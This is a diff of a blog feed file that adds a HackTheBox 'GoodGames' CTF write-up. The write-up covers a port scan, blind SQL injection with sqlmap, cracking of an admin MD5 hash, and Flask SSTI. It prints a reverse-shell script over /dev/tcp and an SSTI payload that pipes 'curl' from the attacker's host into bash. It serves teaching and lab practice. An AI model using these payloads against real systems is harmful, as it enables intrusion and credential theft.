@@ -8,8 +8,366 @@
     <author>
       <name>J. Alex Buschinelli</name>
       <email>buschinellijoao@gmail.com</email>
-      <uri>https://ashishchaudhary.in/hacker-blog</uri>
+      <uri>https://alexbsec.github.io/</uri>
     </author>
+    
+      <item>
+        <title>GoodGames - HackTheBox</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Let’s solve another &lt;a href=&quot;https://app.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt; CTF. In this box, we are going to see SQL injection, Server-Side Template Injection (SSTI) and Docker breakout.&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+
+&lt;p&gt;The challenge description is:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;About GoodGames&lt;/p&gt;
+
+  &lt;p&gt;GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;render_template_string&lt;/code&gt; in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Very descriptive, huh? The description already tells us what path should we take
+in order to solve the challenge.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Reconnaissance&lt;/li&gt;
+  &lt;li&gt;Getting foothold&lt;/li&gt;
+  &lt;li&gt;Crafting the attack&lt;/li&gt;
+  &lt;li&gt;Getting root&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Each concept, including SQL injection, SSTI, and Docker escape, will be explained as needed throughout the four steps.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;Alright. As a basic procedure to solve any box or CTF-like machine, we will start enumerating the system’s ports. To do so,
+we will be using Nmap:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap 10.129.96.71
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Sun Jan  7 23:08:10 2024 as: nmap -p- -T4 --min-rate 1000 -A -oN ports.nmap 10.129.96.71&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.96.71
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65534 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.48
+|_http-title: GoodGames | Community and Store
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+TCP/IP fingerprint:
+OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1/7%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40632%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;659B2F51
+OS:%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;105%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10D%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+OS:O1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11NW7%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11NW7%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANNT11NW7%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11NW7%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11
+OS:NW7%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+OS:R&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FAF0%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANNSNW7%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS
+OS:%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T
+OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Network Distance: 2 hops
+Service Info: Host: goodgames.htb
+
+TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 554/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HOP RTT       ADDRESS
+1   274.29 ms 10.10.16.1
+2   130.91 ms 10.129.96.71
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Jan  7 23:10:09 2024 -- 1 IP address (1 host up) scanned in 119.67 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Showing the only open port is a web service at port 80. Let’s access it with our preferreble browser.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs1.png&quot; alt=&quot;GoodGames homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at it, we notice a few things: first, we have a way to register a new account by clicking on the top-right corner link. 
+It is always a good starting point when performing a pentest to register an account and check what functionalities are within the 
+powers of a normal user. When we click the little man’s icon, we have a button to register a new account. Let’s hit that. After
+registering a new account, we can access it using the same icon, but now providing our credentials. This is the page we arrive at
+after logging in:&lt;/p&gt;
+
+&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs2.png&quot; alt=&quot;mula profile page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since the challenge explicitly tells us about a SQL injection vulnerability, let’s logout and log back in, but now
+we will analyze the request using BurpSuite:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs3.png&quot; alt=&quot;burpsuite login request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After some tests, I found that the server was responding with
+‘Internal Server Error’ message (even though with a 200 status code) if I was giving a correct email with wrong credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs4.png&quot; alt=&quot;wrong credentials attempt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And also some SQL injection payloads such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;+and+1=1--;&lt;/code&gt; was not working. These were giving me ‘Incorrect credentials supplied’ for
+some reason, even with the correct password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs5.png&quot; alt=&quot;sqli attempt fail&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So this got me thinking that neither &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; nor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; was being interpreted as comment lines.
+Maybe they are being escaped. Another possibility is to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;. That’s what I’ve tried, and it actually worked:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs6.png&quot; alt=&quot;sqli success&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Amazing! Now that we now that this is our injection point, we can try to enumerate the database in order to find an admin account of 
+some sort. Since this injection does not retrieve anything back to us, we will have to base our search blindly. &lt;a href=&quot;https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL%20-%20Time%20Based%20SQLi/README.md&quot;&gt;This&lt;/a&gt;
+repo is great for testing time-based SQLi. The specific payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mula%40mula.com&apos;XOR(if(now()=sysdate(),sleep(5*5),0))OR&apos;#--;&lt;/code&gt; confirmed
+a time delay of 25 seconds for the server to respond, thus the vulnerability.&lt;/p&gt;
+
+&lt;p&gt;Since retrieving everything manually would take an unecessary amount of work, we’ll use SQLmap to our advantage. This was what I’ve 
+ran:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.129.96.71/login &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;email=mula@mula.com&amp;amp;password=1234&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;,email,name,password
+1,admin@goodgames.htb,admin,2b22337f218b2d82dfc3b6f77e7cb8ec
+2,mula@mula.com,mula,81dc9bdb52d04dc20036dbd8313ed055 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1234&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we have the admin account + its password hash. With a quick search, we can find this hash to be a MD5 hash:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs7.png&quot; alt=&quot;hash is md5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can &lt;a href=&quot;https://crackstation.net/&quot;&gt;CrackStation&lt;/a&gt; to crack this hash:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs8.png&quot; alt=&quot;cracstation result&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got the pair of credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@goodgames.htb:superadministrator&lt;/code&gt;. Let’s log in with this account now:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs9.png&quot; alt=&quot;admin profile&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Note that on the top-right corner we now have a gear icon which leads to  http://internal-administration.goodgames.htb/. To access this
+page, we will need to add this domain to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; directory. Just run&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;machine-ip&amp;gt; internal-administration.goodgames.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and you should be able to access it right afterwards.&lt;/p&gt;
+
+&lt;h3 id=&quot;ssti&quot;&gt;SSTI&lt;/h3&gt;
+
+&lt;p&gt;Once we are inside the adminstration panel, we can see many different functionalities. While most of them are illustrative, I’ve
+found this one to be the only one that we can actually play around with:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs10.png&quot; alt=&quot;admin panel change name&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can change our name to something else here, and since this is the only endpoint where we can actually test, this must be
+the one related to Server Side Template Injection vulnerability (SSTI). But what is SSTI?&lt;/p&gt;
+
+&lt;p&gt;SSTI is a vulnerability that occurs when an application allows user-supplied input to be executed as a part of the template rendering process. This can lead to the execution of arbitrary code, potentially leading to server compromise or data leakage.
+In the worst case scenario, we could even get a reverse shell, depending on how the server sanitizes the input.&lt;/p&gt;
+
+&lt;p&gt;Since we are dealing with a Flask application, we can limit our search scope to Python SSTI. Upon a quick search,
+I found &lt;a href=&quot;https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/&quot;&gt;this&lt;/a&gt; aticle about Flask SSTI examples.
+In it, we can see that a testable parameter is {{2*3}} for example. This would render into the number 6. Since changing
+your full name in the application results into a template renderization, this is a perfect payload to test it out.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs11.png&quot; alt=&quot;ssti first paylaod&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, the vulnerability is present.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;
+
+&lt;p&gt;According to the article, we can see that one way to create a reverse shell is to
+make the server download a bash script from our local machine and execute it. To do so, we will need to create a file with
+the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;our-ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Save it under the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rev-shell&lt;/code&gt; and then, start our netcat on the same port we typed in the script. Then, 
+we need to make sure the server also downloads the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rev-shell&lt;/code&gt; file. To do this, we will also open a Python server
+on port 80. After all of that is setup, we send this payload to the server:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{{request.application.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;curl &amp;lt;our-ip&amp;gt;/rev-shell | bash&apos;).read()}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we get our shell!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/ggs12.png&quot; alt=&quot;rev shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;First, we are root, but the absence of the root flag in the /root directory shows us that we might be inside a Docker container, and that we are root within the container. In real life, we would not have a flag waiting for us in /root, so we would need to resort to other techniques to check if we are inside a Docker container.
+The first thing we can do is run ifconfig and check the IP address of the machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# ifconfig
+ifconfig
+eth0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
+        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
+        ether 02:42:ac:13:00:02  txqueuelen 0  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        RX packets 1538  bytes 235795 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;230.2 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1341  bytes 2871375 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.7 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        RX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that our IP does not match the one of the actual box. Another way to check if we are indeed inside a Docker container
+is to see if a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dockerenv&lt;/code&gt; file exists in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; / &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; / &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 88
+drwxr-xr-x   1 root root 4096 Nov  5  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;   1 root root    0 Nov  5  2021 .dockerenv
+drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
+drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
+drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
+drwxr-xr-x   5 root root  340 Jan 12 23:03 dev
+drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
+drwxr-xr-x   1 root root 4096 Nov  5  2021 home
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A final test we can perform to determine if we are operating within a Docker environment is to examine how the filesystem is mounted:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
+Filesystem      Size  Used Avail Use% Mounted on
+overlay         8.9G  5.3G  3.2G  63% /
+tmpfs            64M     0   64M   0% /dev
+tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
+/dev/sda1       8.9G  5.3G  3.2G  63% /home/augustus
+shm              64M     0   64M   0% /dev/shm
+tmpfs           2.0G     0  2.0G   0% /proc/acpi
+tmpfs           2.0G     0  2.0G   0% /sys/firmware
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
